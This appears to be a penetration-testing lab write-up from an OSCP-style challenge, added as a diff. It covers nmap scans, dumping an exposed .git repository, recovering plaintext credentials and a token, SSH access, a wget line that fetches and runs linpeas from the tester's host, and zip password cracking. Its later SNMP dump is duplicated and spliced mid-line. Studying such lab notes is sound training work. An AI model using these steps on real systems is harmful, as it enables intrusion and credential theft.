@@ -1,0 +1,827 @@
+Machine .144
+
+Nmap scan report for 192.168.230.144
+Host is up (0.053s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-git: 
+|   192.168.230.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-generator: Nicepage 4.21.12, nicepage.com
+|_http-title: Home
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=11/24%OT=21%CT=1%CU=42771%PV=Y%DS=4%DC=T%G=Y%TM=674
+OS:34E67%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%II=I%TS=A)OPS(O
+OS:1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11N
+OS:W7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
+OS:=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
+OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
+OS:=5516%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+-   Hops 1-3 are the same as for 192.168.230.141
+4   64.11 ms 192.168.230.144
+
+
+#Enumarating the git directory
+
+┌──(oscpa)─(kali㉿kali)-[~/oscpa]
+└─$ ./git_dumper.py http://192.168.230.144/.git/ gittest
+
+/home/kali/oscpa/./git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
+  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
+[-] Testing http://192.168.230.144/.git/HEAD [200]
+[-] Testing http://192.168.230.144/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://192.168.230.144/.gitignore [404]
+[-] http://192.168.230.144/.gitignore responded with status code 404
+[-] Fetching http://192.168.230.144/.git/ [200]
+[-] Fetching http://192.168.230.144/.git/index [200]
+[-] Fetching http://192.168.230.144/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://192.168.230.144/.git/api/ [200]
+[-] Fetching http://192.168.230.144/.git/README.md [200]
+Task .git/api/ raised exception:
+[-] Fetching http://192.168.230.144/.git/HEAD [200]
+Traceback (most recent call last):
+  File "/home/kali/oscpa/./git_dumper.py", line 155, in run
+    result = self.do_task(task, *self.args)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kali/oscpa/./git_dumper.py", line 302, in do_task
+    assert is_html(response)
+           ^^^^^^^^^^^^^^^^^
+AssertionError
+[-] Fetching http://192.168.230.144/.git/hooks/ [200]
+[-] Fetching http://192.168.230.144/.git/config [200]
+[-] Fetching http://192.168.230.144/.git/branches/ [200]
+[-] Fetching http://192.168.230.144/.git/configuration/ [200]
+[-] Fetching http://192.168.230.144/.git/description [200]
+[-] Fetching http://192.168.230.144/.git/info/ [200]
+[-] Fetching http://192.168.230.144/.git/logs/ [200]
+[-] Fetching http://192.168.230.144/.git/orders/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/ [200]
+[-] Fetching http://192.168.230.144/.git/robots.txt [200]
+[-] Fetching http://192.168.230.144/.git/refs/ [200]
+[-] Fetching http://192.168.230.144/.git/configuration/database.php [200]
+[-] Fetching http://192.168.230.144/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://192.168.230.144/.git/packed-refs [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/post-update.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-push.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://192.168.230.144/.git/hooks/push-to-checkout.sample [200]
+[-] Fetching http://192.168.230.144/.git/info/exclude [200]
+[-] Fetching http://192.168.230.144/.git/logs/HEAD [200]
+[-] Fetching http://192.168.230.144/.git/hooks/update.sample [200]
+[-] Fetching http://192.168.230.144/.git/orders/search.php [200]
+[-] Fetching http://192.168.230.144/.git/objects/info/ [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/8a/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/93/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/80/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/44/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/pack/ [200]
+[-] Fetching http://192.168.230.144/.git/refs/heads/ [200]
+[-] Fetching http://192.168.230.144/.git/refs/remotes/ [200]
+[-] Fetching http://192.168.230.144/.git/refs/tags/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/80/9af487f5bb4b71659f897b793347ce62a3b5f4 [200]
+[-] Fetching http://192.168.230.144/.git/objects/93/290282d106a338e8d8a60e4297173c677aa73d [200]
+[-] Fetching http://192.168.230.144/.git/objects/44/a055daf7a0cd777f28f444c0d29ddf3ff08c54 [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/remotes/ [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/heads/ [200]
+[-] Fetching http://192.168.230.144/.git/objects/8a/d08b041c8e2dfe72cc2ba90bcaed4d1088873f [200]
+[-] Fetching http://192.168.230.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.pack [200]
+[-] Fetching http://192.168.230.144/.git/refs/remotes/origin/ [200]
+[-] Fetching http://192.168.230.144/.git/refs/heads/main [200]
+[-] Fetching http://192.168.230.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.idx [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/remotes/origin/ [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/heads/main [200]
+[-] Fetching http://192.168.230.144/.git/refs/remotes/origin/HEAD [200]
+[-] Fetching http://192.168.230.144/.git/logs/refs/remotes/origin/HEAD [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 7 paths from the index
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa]
+└─$ cd gittest 
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa/gittest]
+└─$ ls -a
+.  ..  .git  README.md  api  configuration  orders  robots.txt
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa/gittest]
+└─$ cd .git   
+                                                                                                                                                                            
+┌──(oscpa)─(kali㉿kali)-[~/oscpa/gittest/.git]
+└─$ git log
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:57:12 2022 +0200
+
+    Create database.php
+
+commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:56:19 2022 +0200
+
+    Delete database.php
+
+commit eda55ed6455d29532295684e3900cda74d695067
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:40 2022 +0200
+
+    Create robots.txt
+
+commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:08 2022 +0200
+
+    Create search.php
+
+commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:26:09 2022 +0200
+
+    Setting up database.php
+
+commit 58cfadc91978ec5db50a03c571493e3038d2935d
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:48 2022 +0200
+
+    Create index.php
+
+#Enumerating the security update repository and few others and foung some usernames and password
+
+┌──(oscpa)─(kali㉿kali)-[~/oscpa/gittest/.git]
+└─$ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54       
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+diff --git a/configuration/database.php b/configuration/database.php
+index 55b1645..8ad08b0 100644
+--- a/configuration/database.php
++++ b/configuration/database.php
+@@ -2,8 +2,9 @@
+ class Database{
+     private $host = "localhost";
+     private $db_name = "staff";
+-    private $username = "stuart@challenge.lab";
+-    private $password = "BreakingBad92";
++    private $username = "";
++    private $password = "";
++// Cleartext creds cannot be added to public repos!
+     public $conn;
+     public function getConnection() {
+         $this->conn = null;
+
+
+┌──(kali㉿kali)-[~/oscpa/crystal.oscp/.git]
+└─$ git show 5e212bcd0b8d5815af1c4fdfccd6a07c16e1330b
+commit 5e212bcd0b8d5815af1c4fdfccd6a07c16e1330b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:22 2022 +0200
+
+
+<?php
++class Database{
++    private $host = "localhost";
++    private $db_name = "staff";
++    private $username = "dean@challenge.pwk";
++    private $password = "BreakingBad92";
++    public $conn;
++    public function getConnection() {
++        $this->conn = null;
++        try{
++            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
++            $this->conn->exec("set names utf8");
++        }catch(PDOException $exception){
++            echo "Connection error: " . $exception->getMessage();
++        }
++        return $this->conn;
++    }
++}
+
+Was able to get access with stuart credential to both the ftp and ssh ports
+
+──(kali㉿kali)-[~/oscpa]
+└─$ ssh stuart@192.168.230.144                           
+stuart@192.168.230.144's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Nov 26 04:18:07 PM UTC 2024
+
+  System load:  0.0                Processes:               202
+  Usage of /:   39.9% of 18.53GB   Users logged in:         0
+  Memory usage: 7%                 IPv4 address for ens160: 192.168.230.144
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
+stuart@oscp:~$ su
+
+
+Transfered linpeas to the target with 
+wget http://kaliip:8000/linpeas.sh -o linpeas.sh
+chmod a+x linpeas.sh
+./linpeas.sh
+
+Found some backup zip files in the opt directory. I used the ftp access I have and the "get" fuction in ftp to download the file localy
+only the sitebackup3.zip has info, others 2 files were returning error.
+#Cracking
+zip2john sitebackup3.zip > zip.john
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.john
+
+Found the password to unzip the file, the used 7z to uzing. and entered the password when asked.
+
+Enumerated the output file and found a secret password, then used it to elevate privilege to root
+
+su 
+password
+rootshell
+
+
+Machine 145.
+
+Enumerated with nmap
+──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.135.145    
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 10:59 CET
+Nmap scan report for hermes.oscp (192.168.135.145)
+Host is up (0.044s latency).
+Not shown: 994 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Samuel's Personal Site
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2024-11-28T09:59:38+00:00
+|_ssl-date: 2024-11-28T10:00:18+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2024-11-27T08:10:20
+|_Not valid after:  2025-05-29T08:10:20
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3
+Aggressive OS guesses: Microsoft Windows XP SP3 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-11-28T09:59:39
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   41.37 ms 192.168.45.1
+2   41.25 ms 192.168.45.254
+3   41.40 ms 192.168.251.1
+4   41.56 ms hermes.oscp (192.168.135.145)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.60 seconds
+
+Did, directory bruteforce and also enumerated with whatweb, checked website source code. Unfortunately, none yield a better result. I had to scan the udp port. Because the result was taken time, I only sacned port 161.
+┌──(kali㉿kali)-[~/oscpa]
+└─$ nmap -sC -sU -p 161 192.168.128.145
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 18:53 CET
+Nmap scan report for 192.168.128.145
+Host is up (0.037s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+| snmp-win32-users: 
+|   Administrator
+|   DefaultAccount
+|   Guest
+|   WDAGUtilityAccount
+|   offsec
+|_  zachary
+| snmp-win32-software: 
+|   Microsoft Edge; 2023-02-24T06:08:12
+|   Microsoft Edge Update; 2023-03-02T01:34:30
+|   Microsoft Edge WebView2 Runtime; 2023-02-24T06:08:48
+|   Microsoft Update Health Tools; 2023-01-05T05:04:48
+|   Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.24.281; 2023-01-05T05:04:50
+|   Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.281; 2023-01-05T05:04:50
+|   Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127; 2023-01-05T05:04:48
+|   Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:48
+|   Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127; 2023-01-05T05:04:50
+|   Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:50
+|   Mouse Server version 1.7.8.5; 2023-01-05T05:04:50
+|   PuTTY release 0.76 (64-bit); 2023-01-05T05:04:48
+|   Update for Windows 10 for x64-based Systems (KB5001716); 2023-01-05T05:04:48
+|_  VMware Tools; 2023-01-05T05:04:48
+| snmp-processes: 
+|   1: 
+|     Name: System Idle Process
+|   4: 
+|     Name: System
+|   92: 
+|     Name: Registry
+|   132: 
+|     Name: msdtc.exe
+|   312: 
+|     Name: dwm.exe
+|   368: 
+|     Name: smss.exe
+|   404: 
+|     Name: svchost.exe
+|   456: 
+|     Name: csrss.exe
+|   552: 
+|     Name: svchost.exe
+|   556: 
+|     Name: wininit.exe
+|   572: 
+|     Name: csrss.exe
+|   648: 
+|     Name: winlogon.exe
+|   668: 
+|     Name: services.exe
+|   700: 
+|     Name: lsass.exe
+|   792: 
+|     Name: cmd.exe
+|   800: 
+|     Name: svchost.exe
+|   820: 
+|     Name: fontdrvhost.exe
+|   832: 
+|     Name: svchost.exe
+|   900: 
+|     Name: svchost.exe
+|   948: 
+|     Name: svchost.exe
+|   1004: 
+|     Name: fontdrvhost.exe
+|   1088: 
+|     Name: svchost.exe
+|   1108: 
+|     Name: svchost.exe
+|   1128: 
+|     Name: svchost.exe
+|   1168: 
+|     Name: svchost.exe
+|   1212: 
+|     Name: svchost.exe
+|   1216: 
+|     Name: svchost.exe
+|   1284: 
+|     Name: svchost.exe
+|   1292: 
+|     Name: conhost.exe
+|   1380: 
+|     Name: svchost.exe
+|   1392: 
+|     Name: svchost.exe
+|   1472: 
+|     Name: svchost.exe
+|   1504: 
+|     Name: svchost.exe
+|   1520: 
+|     Name: svchost.exe
+|   1540: 
+|     Name: vm3dservice.exe
+|   1548: 
+|     Name: SgrmBroker.exe
+|   1616: 
+|     Name: svchost.exe
+|   1636: 
+|     Name: svchost.exe
+|   1652: 
+|     Name: svchost.exe
+|   1676: 
+|     Name: svchost.exe
+|   1780: 
+|     Name: svchost.exe
+|   1804: 
+|     Name: Memory Compression
+|   1860: 
+|     Name: svchost.exe
+|   1892: 
+|     Name: svchost.exe
+|   1908: 
+|     Name: svchost.exe
+|   1976: 
+|     Name: svchost.exe
+|   2012: 
+|     Name: svchost.exe
+|   2024: 
+|     Name: svchost.exe
+|   2032: 
+|     Name: svchost.exe
+|   2060: 
+|     Name: svchost.exe
+|   2100: 
+|     Name: svchost.exe
+|   2140: 
+|     Name: svchost.exe
+|   2160: 
+|     Name: MsMpEng.exe
+|   2216: 
+|     Name: svchost.exe
+|   2236: 
+|     Name: svchost.exe
+|   2256: 
+|     Name: svchost.exe
+|   2348: 
+|     Name: svchost.exe
+|   2452: 
+|     Name: spoolsv.exe
+|   2476: 
+|     Name: CompatTelRunner.exe
+|   2480: 
+|     Name: svchost.exe
+|   2508: 
+|     Name: svchost.exe
+|   2540: 
+|     Name: svchost.exe
+|   2604: 
+|     Name: svchost.exe
+|   2768: 
+|     Name: svchost.exe
+|   2776: 
+|     Name: svchost.exe
+|   2788: 
+|     Name: svchost.exe
+|   2808: 
+|     Name: svchost.exe
+|   2828: 
+|     Name: svchost.exe
+|   2856: 
+|     Name: svchost.exe
+|   2932: 
+|     Name: svchost.exe
+|   2964: 
+|     Name: vmtoolsd.exe
+|   2972: 
+|     Name: snmp.exe
+|   2980: 
+|     Name: VGAuthService.exe
+|   2992: 
+|     Name: svchost.exe
+|   3000: 
+|     Name: svchost.exe
+|   3020: 
+|     Name: svchost.exe
+|   3056: 
+|     Name: svchost.exe
+|   3076: 
+|     Name: svchost.exe
+|   3396: 
+|     Name: svchost.exe
+|   3464: 
+|     Name: conhost.exe
+|   3532: 
+|     Name: GameBar.exe
+|   3768: 
+|     Name: svchost.exe
+|   3792: 
+|     Name: dllhost.exe
+|   3812: 
+|     Name: conhost.exe
+|   3828: 
+|     Name: svchost.exe
+|   4072: 
+|     Name: WmiPrvSE.exe
+|   4212: 
+|     Name: svchost.exe
+|   4224: 
+|     Name: svchost.exe
+|   4292: 
+|     Name: MoUsoCoreWorker.exe
+|   4364: 
+|     Name: MicrosoftEdgeUpdate.exe
+|   4368: 
+|     Name: RuntimeBroker.exe
+|   4432: 
+|     Name: svchost.exe
+|   4444: 
+|     Name: svchost.exe
+|   4476: 
+|     Name: Mouse Server Luminati.exe
+|   4624: 
+|     Name: svchost.exe
+|   4632: 
+|     Name: svchost.exe
+|   4640: 
+|     Name: svchost.exe
+|   4668: 
+|     Name: RuntimeBroker.exe
+|   4696: 
+|     Name: SIHClient.exe
+|   4772: 
+|     Name: svchost.exe
+|   4996: 
+|     Name: svchost.exe
+|   5028: 
+|     Name: svchost.exe
+|   5048: 
+|     Name: dllhost.exe
+|   5184: 
+|     Name: SearchIndexer.exe
+|   5304: 
+|     Name: sihost.exe
+|   5332: 
+|     Name: svchost.exe
+|   5380: 
+|     Name: svchost.exe
+|   5416: 
+|     Name: OneDriveStandaloneUpdater.exe
+|   5452: 
+|     Name: MicrosoftEdgeUpdate.exe
+|   5460: 
+|     Name: MouseServer.exe
+
+I got all the system service and started checking them mannually for vulnerability
+This command also helps for snmp enumeration
+
+iso.3.6.1.2.1.25.4.2.1.2.3000 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3020 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3056 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3076 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3392 = STRING: "sihost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3396 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3632 = STRING: "cmd.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3688 = STRING: "conhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3700 = STRING: "fontdrvhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3768 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3784 = STRING: "dwm.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3792 = STRING: "dllhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3828 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4072 = STRING: "WmiPrvSE.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4212 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4224 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4292 = STRING: "MoUsoCoreWorker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4368 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4432 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4476 = STRING: "Mouse Server Luminati.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4624 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4640 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4668 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5016 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5020 = STRING: "ctfmon.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5048 = STRING: "dllhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5176 = STRING: "winlogon.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5184 = STRING: "SearchIndexer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5304 = STRING: "sihost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5332 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5380 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5452 = STRING: "MicrosoftEdgeUpdate.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5460 = STRING: "MouseServer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5476 = STRING: "taskhostw.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5496 = STRING: "dwm.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5500 = STRING: "MicrosoftEdgeUpdate.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5600 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5636 = STRING: "UserOOBEBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5644 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5736 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5796 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5824 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5900 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5932 = STRING: "explorer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5960 = STRING: "TextInputHost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6012 = STRING: "cmd.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6048 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6164 = STRING: "WinStore.App.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6184 = STRING: "StartMenuExperienceHost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6268 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6392 = STRING: "SearchApp.exe"
+iso.3.6.1.2.1.25.4.2.1.2.6432 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.644iso.3.6.1.2.1.25.4.2.1.2.3000 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3020 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3056 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3076 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3392 = STRING: "sihost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3396 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3632 = STRING: "cmd.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3688 = STRING: "conhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3700 = STRING: "fontdrvhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3768 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3784 = STRING: "dwm.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3792 = STRING: "dllhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.3828 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4072 = STRING: "WmiPrvSE.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4212 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4224 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4292 = STRING: "MoUsoCoreWorker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4368 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4432 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4476 = STRING: "Mouse Server Luminati.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4624 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4640 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.4668 = STRING: "RuntimeBroker.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5016 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5020 = STRING: "ctfmon.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5048 = STRING: "dllhost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5176 = STRING: "winlogon.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5184 = STRING: "SearchIndexer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5304 = STRING: "sihost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5332 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5380 = STRING: "svchost.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5452 = STRING: "MicrosoftEdgeUpdate.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5460 = STRING: "MouseServer.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5476 = STRING: "taskhostw.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5496 = STRING: "dwm.exe"
+iso.3.6.1.2.1.25.4.2.1.2.5500 = STRING: "MicrosoftEdgeUpdate.exe"
